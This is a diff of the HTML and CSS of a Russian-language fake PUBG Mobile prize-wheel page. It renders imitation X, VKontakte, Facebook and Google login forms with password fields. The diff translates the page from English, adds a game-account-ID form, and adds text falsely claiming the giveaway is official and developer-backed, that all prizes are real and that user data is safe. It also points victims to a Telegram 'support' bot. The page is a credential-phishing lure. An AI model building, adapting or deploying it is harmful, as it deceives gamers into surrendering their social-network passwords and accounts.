-                transform: translateX(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
         }
         
         .x-step2-title {
@@ -1467,16 +1349,16 @@
             font-weight: 700;
             margin-bottom: 30px;
             text-align: center;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             color: white;
         }
         
         .x-password-label {
             display: block;
             margin-bottom: 8px;
-            color: var(--text-main);
+            color: #8da1b5;
             font-size: 14px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         .x-password-input {
@@ -1488,15 +1370,14 @@
             font-size: 17px;
             background: #000;
             color: white;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             transition: all 0.3s;
         }
         
         .x-password-input:focus {
             outline: none;
             border-color: #1D9BF0;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(29, 155, 240, 0.2);
+            box-shadow: 0 0 0 2px rgba(29, 155, 240, 0.2);
         }
         
         .x-login-btn {
@@ -1510,13 +1391,12 @@
             font-weight: 700;
             cursor: pointer;
             margin-bottom: 20px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             transition: all 0.3s;
         }
         
         .x-login-btn:hover {
             background: #1A8CD8;
-            transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(29, 155, 240, 0.3);
         }
         
@@ -1527,7 +1407,7 @@
             text-decoration: none;
             font-size: 15px;
             margin-bottom: 20px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         .x-forgot-password:hover {
@@ -1538,9 +1418,9 @@
             margin-top: 30px;
             padding-top: 20px;
             border-top: 1px solid #2F3336;
-            color: var(--text-main);
+            color: #8da1b5;
             font-size: 15px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             text-align: center;
         }
         
@@ -1568,7 +1448,7 @@
             font-weight: 500;
             margin-bottom: 30px;
             color: #000;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         .vk-label {
@@ -1576,7 +1456,7 @@
             margin-bottom: 8px;
             color: #818C99;
             font-size: 13px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         .vk-input {
@@ -1588,7 +1468,7 @@
             font-size: 16px;
             background: #F2F3F5;
             color: #000;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             transition: all 0.3s;
         }
         
@@ -1596,8 +1476,7 @@
             outline: none;
             border-color: #4A76A8;
             background: white;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(74, 118, 168, 0.2);
+            box-shadow: 0 0 0 2px rgba(74, 118, 168, 0.2);
         }
         
         .vk-checkbox {
@@ -1615,7 +1494,7 @@
         .vk-checkbox label {
             color: #818C99;
             font-size: 14px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         .vk-submit-btn {
@@ -1629,13 +1508,12 @@
             font-weight: 500;
             cursor: pointer;
             margin-bottom: 20px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             transition: all 0.3s;
         }
         
         .vk-submit-btn:hover {
             background: #3C658F;
-            transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(74, 118, 168, 0.3);
         }
         
@@ -1648,7 +1526,7 @@
             color: #4A76A8;
             text-decoration: none;
             font-size: 16px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         .vk-link:hover {
@@ -1695,21 +1573,20 @@
             font-size: 17px;
             background: white;
             color: #1C1E21;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             transition: all 0.3s;
         }
         
         .fb-input:focus {
             outline: none;
-            border-color: var(--accent);
+            border-color: #1877F2;
             box-shadow: 0 0 0 2px #E7F3FF;
-            transform: translateY(-2px);
         }
         
         .fb-submit-btn {
             width: 100%;
             padding: 14px;
-            background: var(--accent);
+            background: #1877F2;
             color: white;
             border: none;
             border-radius: 6px;
@@ -1717,24 +1594,23 @@
             font-weight: 600;
             cursor: pointer;
             margin: 10px 0 20px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             transition: all 0.3s;
         }
         
         .fb-submit-btn:hover {
             background: #166FE5;
-            transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
         }
         
         .fb-link {
             display: block;
             text-align: center;
-            color: var(--accent);
+            color: #1877F2;
             text-decoration: none;
             font-size: 14px;
             margin-bottom: 20px;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         .fb-link:hover {
@@ -1759,13 +1635,12 @@
             font-weight: 600;
             cursor: pointer;
             display: block;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             transition: all 0.3s;
         }
         
         .fb-create-btn:hover {
             background: #36A420;
-            transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(66, 183, 42, 0.3);
         }
         
@@ -1780,16 +1655,6 @@
             z-index: 3000;
             display: none;
             overflow-y: auto;
-            animation: googleFadeIn 0.4s ease;
-        }
-
-        @keyframes googleFadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
         }
         
         .google-fullscreen.active {
@@ -1803,18 +1668,6 @@
             position: relative;
             top: 50%;
             transform: translateY(-50%);
-            animation: googleSlideUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes googleSlideUp {
-            from {
-                opacity: 0;
-                transform: translateY(-50%) scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(-50%) scale(1);
-            }
         }
 
         .google-logo {
@@ -1868,8 +1721,7 @@
 
         .google-input:focus {
             border-color: #0d47a1;
-            box-shadow: 0 0 10px rgba(26, 115, 232, 0.3);
-            transform: translateY(-2px);
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
         }
 
         .google-guest-mode {
@@ -1905,7 +1757,6 @@
 
         .google-btn-text:hover {
             color: #0d47a1;
-            transform: translateY(-2px);
         }
 
         .google-btn-blue {
@@ -1922,7 +1773,6 @@
 
         .google-btn-blue:hover {
             background-color: #0d47a1;
-            transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(26, 115, 232, 0.4);
         }
 
@@ -1974,18 +1824,233 @@
             margin-bottom: 40px;
         }
 
+        /* Новый информационный блок */
+        .info-section {
+            background: rgba(20, 35, 60, 0.9);
+            border-radius: 20px;
+            padding: 30px;
+            width: 100%;
+            max-width: 800px;
+            margin: 30px 0;
+            border: 2px solid rgba(123, 104, 238, 0.3);
+            box-shadow: 
+                0 15px 30px rgba(0, 0, 0, 0.5),
+                inset 0 0 20px rgba(42, 59, 90, 0.2);
+            backdrop-filter: blur(10px);
+        }
+        
+        .info-section h2 {
+            color: #7B68EE;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 500;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .info-block {
+            background: rgba(12, 26, 45, 0.7);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 15px;
+            border: 1px solid #2a3b5a;
+            transition: all 0.3s;
+        }
+        
+        .info-block:hover {
+            border-color: #7B68EE;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(123, 104, 238, 0.2);
+        }
+        
+        .info-block h3 {
+            color: #8da1b5;
+            margin-bottom: 10px;
+            font-size: 18px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .info-block h3 i {
+            color: #7B68EE;
+        }
+        
+        .info-block p {
+            color: #8da1b5;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 10px;
+            font-family: Arial, sans-serif;
+        }
+        
+        .info-block ul {
+            color: #8da1b5;
+            font-size: 14px;
+            line-height: 1.6;
+            padding-left: 20px;
+            margin: 10px 0;
+            font-family: Arial, sans-serif;
+        }
+        
+        .info-block li {
+            margin-bottom: 8px;
+        }
+        
+        .info-block li strong {
+            color: #7B68EE;
+        }
+        
+        .warning-note {
+            background: linear-gradient(135deg, rgba(255, 167, 38, 0.1), transparent);
+            border: 1px solid rgba(255, 167, 38, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            color: #ffa726;
+            font-size: 14px;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        /* Блок ввода ID аккаунта */
+        .account-id-section {
+            background: rgba(20, 35, 60, 0.9);
+            border-radius: 20px;
+            padding: 30px;
+            width: 100%;
+            max-width: 800px;
+            margin: 20px 0;
+            border: 2px solid rgba(24, 119, 242, 0.3);
+            box-shadow: 
+                0 15px 30px rgba(0, 0, 0, 0.5),
+                inset 0 0 20px rgba(42, 59, 90, 0.2);
+            backdrop-filter: blur(10px);
+        }
+        
+        .account-id-section h2 {
+            color: #1877F2;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 500;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .account-id-section p {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #8da1b5;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .id-input-group {
+            margin-bottom: 25px;
+        }
+        
+        .id-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #8da1b5;
+            font-size: 16px;
+            font-weight: 500;
+            font-family: Arial, sans-serif;
+        }
+        
+        .id-input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 1px solid #2a3b5a;
+            border-radius: 10px;
+            font-size: 16px;
+            background: rgba(12, 26, 45, 0.7);
+            color: white;
+            font-family: Arial, sans-serif;
+            transition: all 0.3s;
+            outline: none;
+        }
+        
+        .id-input:focus {
+            border-color: #1877F2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+            background: rgba(12, 26, 45, 0.9);
+        }
+        
+        .id-note {
+            margin-top: 10px;
+            color: #8da1b5;
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+            line-height: 1.5;
+        }
+        
+        .id-note i {
+            color: #1877F2;
+            margin-right: 5px;
+        }
+        
+        .save-id-btn {
+            background: linear-gradient(180deg, #1877F2 0%, #1153b3 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 10px;
+        }
+        
+        .save-id-btn:hover:not(:disabled) {
+            background: linear-gradient(180deg, #1A8CD8 0%, #0d47a1 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
+        }
+        
+        .save-id-btn:disabled {
+            background: linear-gradient(45deg, #444, #555);
+            color: #777;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .id-saved-message {
+            display: none;
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(76, 175, 80, 0.1);
+            border: 1px solid rgba(76, 175, 80, 0.3);
+            border-radius: 8px;
+            color: #4CAF50;
+            font-size: 14px;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        
         /* Footer */
         .footer {
             width: 100%;
-            max-width: 800px;
+            max-width: 1400px;
             text-align: center;
             padding: 20px;
             margin-top: 30px;
-            background: var(--bg-card);
+            background: rgba(20, 35, 60, 0.8);
             border-radius: 10px;
-            border-top: 2px solid var(--border-light);
+            border-top: 2px solid #2a3b5a;
             backdrop-filter: blur(10px);
-            animation: fadeIn 1s ease-out 0.5s both;
         }
         
         .footer-links {
@@ -1997,12 +2062,12 @@
         }
         
         .footer-link {
-            color: var(--text-main);
+            color: #8da1b5;
             text-decoration: none;
             font-size: 14px;
             transition: all 0.3s;
             font-weight: 400;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             position: relative;
         }
         
@@ -2013,12 +2078,12 @@
             left: 0;
             width: 0;
             height: 1px;
-            background: var(--accent);
+            background: #1877F2;
             transition: width 0.3s;
         }
         
         .footer-link:hover {
-            color: var(--accent);
+            color: #1877F2;
         }
         
         .footer-link:hover::after {
@@ -2026,28 +2091,33 @@
         }
         
         .copyright {
-            color: var(--text-main);
+            color: #8da1b5;
             font-size: 13px;
             margin-top: 10px;
             line-height: 1.5;
             font-weight: 400;
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
         }
         
-        @media (max-width: 600px) {
-            .winners-counter {
-                top: 10px;
-                right: 10px;
-                padding: 8px 15px;
-                font-size: 12px;
-            }
-            
-            .winners-count {
-                font-size: 14px;
+        .official-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #7B68EE, #4B0082);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
+        
+        @media (max-width: 768px) {
+            .sidebar {
+                width: 200px;
             }
             
             .roulette-container {
-                height: 320px;
+                height: 350px;
             }
             
             .prizes-grid {
@@ -2056,18 +2126,26 @@
             }
             
             .prize-item img {
-                width: 65px;
-                height: 65px;
+                width: 75px;
+                height: 75px;
             }
             
             .center-item img {
-                width: 60px;
-                height: 60px;
+                width: 65px;
+                height: 65px;
             }
             
             .play-btn {
                 padding: 16px 35px;
                 font-size: 18px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .header p {
+                font-size: 14px;
             }
             
             .social-grid {
@@ -2082,6 +2160,10 @@
             .social-icon {
                 width: 50px;
                 height: 50px;
+            }
+            
+            .logo {
+                font-size: 18px;
             }
             
             .get-prize-btn {
@@ -2104,18 +2186,6 @@
                 transform: none;
                 top: 0;
                 margin-top: 40px;
-                animation: googleSlideUpMobile 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            }
-
-            @keyframes googleSlideUpMobile {
-                from {
-                    opacity: 0;
-                    transform: translateY(20px);
-                }
-                to {
-                    opacity: 1;
-                    transform: translateY(0);
-                }
             }
             
             .prize-mail-btn {
@@ -2158,23 +2228,11 @@
             
             .top-menu {
                 padding: 10px 15px;
-                flex-wrap: wrap;
-                margin-top: 60px;
-            }
-            
-            .menu-left {
-                gap: 8px;
-            }
-            
-            .menu-btn {
-                padding: 6px 10px;
-                font-size: 12px;
             }
             
             .language-btn {
                 padding: 6px 10px;
                 font-size: 12px;
-                min-width: 100px;
             }
             
             .prize-mail-btn {
@@ -2182,45 +2240,108 @@
                 font-size: 12px;
             }
             
-            .menu-right {
-                gap: 8px;
+            .logo {
+                font-size: 16px;
+                position: absolute;
+                left: 50%;
+                transform: translateX(-50%);
+                width: auto;
             }
             
-            .notification {
+            .info-section {
                 padding: 20px;
-                max-width: 90%;
+            }
+            
+            .info-block h3 {
+                font-size: 16px;
+            }
+            
+            .info-block p, .info-block ul {
+                font-size: 13px;
+            }
+            
+            .account-id-section {
+                padding: 20px;
+            }
+            
+            .account-id-section h2 {
+                font-size: 20px;
+            }
+            
+            .account-id-section p {
                 font-size: 14px;
+            }
+            
+            .id-input {
+                padding: 12px 15px;
+                font-size: 15px;
+            }
+            
+            .save-id-btn {
+                padding: 12px 30px;
+                font-size: 16px;
             }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- Счетчик победителей -->
-    <div class="winners-counter">
-        <i class="fas fa-trophy"></i>
-        Winners: <span class="winners-count" id="winnersCount">0</span>
+    <!-- Кнопка открытия меню -->
+    <button class="menu-toggle" id="menuToggle">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <!-- Боковое меню -->
+    <div class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <h3>МЕНЮ</h3>
+        </div>
+        
+        <div class="menu-item" onclick="showNotification('Информация о призах откроется в ближайшее время', false, false)">
+            <i class="fas fa-gift"></i>
+            <span>Призы и награды</span>
+        </div>
+        
+        <div class="menu-item" onclick="showNotification('Список победителей будет опубликован позже', false, false)">
+            <i class="fas fa-trophy"></i>
+            <span>Победители</span>
+        </div>
+        
+        <div class="menu-item" onclick="showNotification('История акций и розыгрышей будет доступна позже', false, false)">
+            <i class="fas fa-history"></i>
+            <span>История акций</span>
+        </div>
+        
+        <div class="menu-item" onclick="showNotification('Правила акции будут опубликованы в ближайшее время', false, false)">
+            <i class="fas fa-book"></i>
+            <span>Правила акции</span>
+        </div>
+        
+        <div class="menu-item support" onclick="window.open('https://t.me/helpumgmbot', '_blank')">
+            <i class="fab fa-telegram"></i>
+            <span>Техподдержка: @helpumgmbot</span>
+        </div>
     </div>
-    
-    <!-- Уведомление в центре -->
+
+    <!-- Уведомление -->
     <div class="notification" id="notification"></div>
     
     <!-- Окно с призом -->
     <div class="prize-window" id="prizeWindow">
         <div class="prize-content">
-            <div class="prize-banner">YOUR PRIZE</div>
+            <div class="prize-banner">ВАШ ПРИЗ</div>
             
             <div class="prize-glow-container">
                 <div class="glow-bg"></div>
-                <img id="winImg" src="" class="prize-image" alt="Prize">
+                <img id="winImg" src="" class="prize-image" alt="Приз">
             </div>
 
             <div class="prize-info">
-                <h2 class="prize-name" id="winName">PRIZE</h2>
-                <p class="prize-desc" id="prizeDescription">The item has been sent to your game mail. Please wait up to 24 hours for transaction processing.</p>
+                <h2 class="prize-name" id="winName">ПРИЗ</h2>
+                <p class="prize-desc" id="prizeDescription">Предмет был отправлен на вашу игровую почту. Пожалуйста, подождите до 24 часов для обработки транзакции.</p>
             </div>
 
-            <button class="collect-btn" id="collectPrizeBtn">COLLECT</button>
+            <button class="collect-btn" id="collectPrizeBtn">ЗАБРАТЬ</button>
         </div>
     </div>
 
@@ -2364,7 +2485,7 @@
         <div class="modal">
             <button class="close-modal" onclick="closeModal('vkModal')">&times;</button>
             <div style="text-align: center;">
-                <img src="vkontakte.png" alt="VKontakte" class="vk-logo">
+                <img src="vkontakte.png" alt="ВКонтакте" class="vk-logo">
             </div>
             <h1 class="vk-title">VKontakte Login</h1>
             
@@ -2425,76 +2546,68 @@
 
     <!-- Верхнее меню -->
     <div class="top-menu">
-        <div class="menu-left">
-            <div class="menu-dropdown">
-                <button class="menu-btn" id="menuBtn">
-                    <i class="fas fa-bars"></i> Menu
-                </button>
-                <div class="dropdown-menu" id="dropdownMenu">
-                    <a href="https://t.me/helpumgmbot" target="_blank" class="dropdown-item">
-                        <i class="fab fa-telegram"></i> Support
-                    </a>
-                    <a href="https://www.instagram.com/pubgmcis" target="_blank" class="dropdown-item">
-                        <i class="fab fa-instagram"></i> Instagram
-                    </a>
-                </div>
+        <div class="language-menu">
+            <button class="language-btn" id="languageBtn">
+                <i class="fas fa-globe"></i> Русский <i class="fas fa-chevron-down"></i>
+            </button>
+            <div class="language-dropdown" id="languageDropdown">
+                <div class="language-option" data-lang="uz">O'zbekcha</div>
+                <div class="language-option" data-lang="en">English</div>
+                <div class="language-option" data-lang="kz">Қазақша</div>
+                <div class="language-option" data-lang="ar">العربية</div>
+                <div class="language-option" data-lang="zh">中文</div>
+                <div class="language-option" data-lang="ky">Кыргызча</div>
+                <div class="language-option" data-lang="dag">Дагестанский</div>
+                <div class="language-option" data-lang="che">Чеченский</div>
+                <div class="language-option" data-lang="az">Azərbaycanca</div>
+                <div class="language-option" data-lang="hy">Հայերեն</div>
+                <div class="language-option" data-lang="jp">日本語</div>
+                <div class="language-option" data-lang="uk">Українська</div>
             </div>
         </div>
-        
-        <div class="menu-right">
-            <div class="language-menu">
-                <button class="language-btn" id="languageBtn">
-                    <i class="fas fa-globe"></i> English <i class="fas fa-chevron-down"></i>
-                </button>
-                <div class="language-dropdown" id="languageDropdown">
-                    <div class="language-option" data-lang="ru">Русский</div>
-                    <div class="language-option" data-lang="en">English</div>
-                    <div class="language-option" data-lang="uz">O'zbekcha</div>
-                </div>
-            </div>
-            
-            <div class="prize-mail-icon">
-                <button class="prize-mail-btn" id="prizeMailBtn">
-                    <i class="fas fa-gift"></i> My prize
-                    <div class="prize-badge" id="prizeBadge">0</div>
-                </button>
-            </div>
+        <div class="logo"></div>
+        <div class="prize-mail-icon">
+            <button class="prize-mail-btn" id="prizeMailBtn">
+                <i class="fas fa-gift"></i> Мой приз
+                <div class="prize-badge" id="prizeBadge">0</div>
+            </button>
         </div>
     </div>
 
     <div class="container">
         <div class="header">
-            <!-- Удален текст "КОЛЕСО УДАЧИ PUBG" -->
+            <h1>КОЛЕСО УДАЧИ</h1>
+            <p>Испытай удачу и выиграй эксклюзивные призы!</p>
         </div>
         
         <div class="roulette-container">
             <div class="prizes-grid">
                 <div class="prize-item" data-id="1">
-                    <img src="priz1.png" alt="Prize">
+                    <img src="priz1.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="2">
-                    <img src="priz2.png" alt="Prize">
+                    <img src="priz2.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="3">
-                    <img src="priz3.png" alt="Prize">
+                    <img src="priz3.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="4">
-                    <img src="priz4.png" alt="Prize">
+                    <img src="priz4.png" alt="Приз">
                 </div>
                 <div class="prize-item center-item" data-id="5">
-                    <img src="priz5.png" alt="Prize">
+                    <img src="priz5.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="6">
-                    <img src="priz6.png" alt="Prize">
+                    <img src="priz6.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="7">
-                    <img src="priz7.png" alt="Prize">
+                    <img src="priz7.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="8">
-                    <img src="priz8.png" alt="Prize">
+                    <img src="priz8.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="9">
-                    <img src="priz9.png" alt="Prize">
+                    <img src="priz9.png" alt="Приз">
                 </div>
             </div>
             
@@ -2505,45 +2618,30 @@
                 <div class="corner corner-bl"></div>
                 <div class="corner corner-br"></div>
             </div>
-            <div class="selection-indicator" id="selectionIndicator">SELECTED</div>
+            <div class="selection-indicator" id="selectionIndicator">ВЫБРАНО</div>
         </div>
         
         <button class="play-btn" id="playBtn">
-            <i class="fas fa-play"></i> PLAY
+            <i class="fas fa-play"></i> ИГРАТЬ
         </button>
-        
-        <!-- Форма ввода ID аккаунта -->
-        <div class="account-id-section" id="accountIdSection">
-            <h2>ENTER PUBG ACCOUNT ID</h2>
-            <p>Please enter your PUBG Mobile account ID to receive the prize</p>
-            
-            <div class="id-input-container">
-                <label class="id-label">PUBG Account ID:</label>
-                <input type="text" class="id-input" id="accountIdInput" placeholder="Enter your account ID" required>
-            </div>
-            
-            <button class="id-submit-btn" id="idSubmitBtn">
-                <i class="fas fa-check"></i> CONTINUE
-            </button>
-        </div>
         
         <!-- Форма выбора соцсети -->
         <div class="social-select-section" id="socialSelectSection">
-            <h2>SELECT RECEIVING METHOD</h2>
-            <p>Select social network to receive the prize</p>
+            <h2>ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ</h2>
+            <p>Выберите социальную сеть для получения приза</p>
             
             <div class="social-grid">
                 <div class="social-option" data-social="vk" onclick="openModal('vkModal')">
                     <div class="social-icon">
-                        <img src="vkontakte.png" alt="VKontakte">
+                        <img src="vkontakte.png" alt="ВКонтакте">
                     </div>
-                    <span>VKontakte</span>
+                    <span>ВКонтакте</span>
                 </div>
                 
                 <div class="social-option" data-social="facebook" onclick="openModal('facebookModal')">
                     <div class="social-icon">
                         <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="#1877F2">
-                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                         </svg>
                     </div>
                     <span>Facebook</span>
@@ -2564,13 +2662,13 @@
                 </div>
             </div>
             
-            <div class="important-note" id="importantNote">
-                <strong>Important:</strong> The prize will be credited to your account within 24 hours
-            </div>
-            
             <button class="get-prize-btn" id="getPrizeBtn">
-                <i class="fas fa-paper-plane"></i> GET PRIZE
+                <i class="fas fa-paper-plane"></i> ПОЛУЧИТЬ ПРИЗ
             </button>
+            
+            <p style="text-align: center; color: #8da1b5; font-size: 14px; margin-top: 15px; font-family: Arial, sans-serif;">
+                <strong>Важно:</strong> Приз будет зачислен на ваш аккаунт в течение 24 часов
+            </p>
         </div>
         
         <!-- Секция подтверждения получения приза -->
@@ -2578,30 +2676,97 @@
             <div class="confirmation-icon">
                 <i class="fas fa-check-circle"></i>
             </div>
-            <h2>APPLICATION ACCEPTED!</h2>
+            <h2>ЗАЯВКА ПРИНЯТА!</h2>
             
             <div class="confirmation-message">
-                Your winnings will be credited to your PUBG Mobile account<br>
-                within <strong>24 hours</strong>.
+                Ваш выигрыш будет зачислен на аккаунт<br>
+                в течение <strong>24 часов</strong>.
             </div>
             
             <p style="color: #8da1b5; font-size: 14px; line-height: 1.5; font-family: Arial, sans-serif;">
-                Thank you for participating!<br>
-                Don't forget to check your in-game inventory.
+                Спасибо за участие!<br>
+                Не забудьте проверить свой инвентарь в игре.
             </p>
+        </div>
+        
+        <!-- Блок ввода ID аккаунта -->
+        <div class="account-id-section" id="accountIdSection">
+            <h2><i class="fas fa-id-card"></i> ВВЕДИТЕ ID ВАШЕГО АККАУНТА</h2>
+            
+            <p>Для зачисления выигранного приза необходимо указать ID вашего игрового аккаунта.</p>
+            
+            <div class="id-input-group">
+                <label class="id-label">ID вашего игрового аккаунта:</label>
+                <input type="text" class="id-input" id="accountIdInput" placeholder="Введите ваш ID (например: 123456789)" maxlength="20">
+                
+                <div class="id-note">
+                    <i class="fas fa-info-circle"></i> ID можно найти в настройках игры или в профиле игрока. Обычно это последовательность цифр.
+                </div>
+            </div>
+            
+            <button class="save-id-btn" id="saveIdBtn">
+                <i class="fas fa-save"></i> СОХРАНИТЬ ID
+            </button>
+            
+            <div class="id-saved-message" id="idSavedMessage">
+                <i class="fas fa-check-circle"></i> ID успешно сохранен! Он будет использован для зачисления приза.
+            </div>
+            
+            <div class="warning-note">
+                <i class="fas fa-exclamation-triangle"></i> ВНИМАНИЕ: Убедитесь, что вводите правильный ID. При вводе неверного ID приз не будет зачислен.
+            </div>
+        </div>
+        
+        <!-- Информационный блок -->
+        <div class="info-section">
+            <h2><i class="fas fa-info-circle"></i> ВАЖНАЯ ИНФОРМАЦИЯ ДЛЯ ПОЛУЧЕНИЯ ПРИЗА</h2>
+            
+            <div class="info-block">
+                <h3><i class="fas fa-sign-in-alt"></i> Как получить приз?</h3>
+                <p>Для получения выигранного приза необходимо:</p>
+                <ul>
+                    <li><strong>1. Войти через социальную сеть</strong> - выберите один из предложенных способов авторизации</li>
+                    <li><strong>2. Указать ID своего аккаунта</strong> - введите ваш игровой ID для зачисления приза (обязательный шаг!)</li>
+                    <li><strong>3. Подтвердить получение</strong> - нажмите кнопку "Получить приз"</li>
+                </ul>
+                <p>После этих действий приз будет отправлен на вашу игровую почту в течение 24 часов.</p>
+            </div>
+            
+            <div class="info-block">
+                <h3><i class="fas fa-shield-alt"></i> Официальный статус акции</h3>
+                <p>Данная акция является <strong>официальным мероприятием</strong>, организованным при поддержке разработчиков.</p>
+                <p><strong>Все призы реальные и действительно выдаются победителям!</strong></p>
+                <p>Мы сотрудничаем напрямую с администрацией игры для обеспечения честного распределения наград.</p>
+            </div>
+            
+            <div class="info-block">
+                <h3><i class="fas fa-check-circle"></i> Гарантии и безопасность</h3>
+                <ul>
+                    <li><strong>✅ 100% выдача призов</strong> - все победители получают свои награды</li>
+                    <li><strong>✅ Безопасность данных</strong> - ваши данные защищены и не передаются третьим лицам</li>
+                    <li><strong>✅ Поддержка 24/7</strong> - техническая поддержка всегда готова помочь</li>
+                    <li><strong>✅ Прозрачность розыгрыша</strong> - все этапы можно отслеживать в реальном времени</li>
+                </ul>
+            </div>
+            
+            <div class="warning-note">
+                <i class="fas fa-exclamation-triangle"></i> ВНИМАНИЕ: Приз зачисляется только после успешной авторизации через социальную сеть и ввода правильного ID аккаунта.
+            </div>
         </div>
     </div>
 
     <!-- Футер -->
     <div class="footer">
         <div class="footer-links">
-            <a href="#" class="footer-link">Terms of Service</a>
-            <a href="#" class="footer-link">Privacy Policy</a>
-            <a href="#" class="footer-link">Cookie Policy</a>
-            <a href="#" class="footer-link">Cookie Preferences</a>
+            <a href="#" class="footer-link">Условия обслуживания</a>
+            <a href="#" class="footer-link">Политика конфиденциальности</a>
+            <a href="#" class="footer-link">Политика Cookie</a>
+            <a href="#" class="footer-link">Предпочтение Cookies</a>
         </div>
         <div class="copyright">
-            Copyright © High Morale Developments Limited. All rights reserved.
+            © 2024 Официальная акция. Все права защищены.<br>
+            <span style="color: #7B68EE; font-weight: 600;">Все призы реальны и выдаются победителям на их игровые аккаунты.</span><br>
+            Техническая поддержка: <a href="https://t.me/helpumgmbot" style="color: #7B68EE; text-decoration: none;">@helpumgmbot</a>
         </div>
     </div>
 
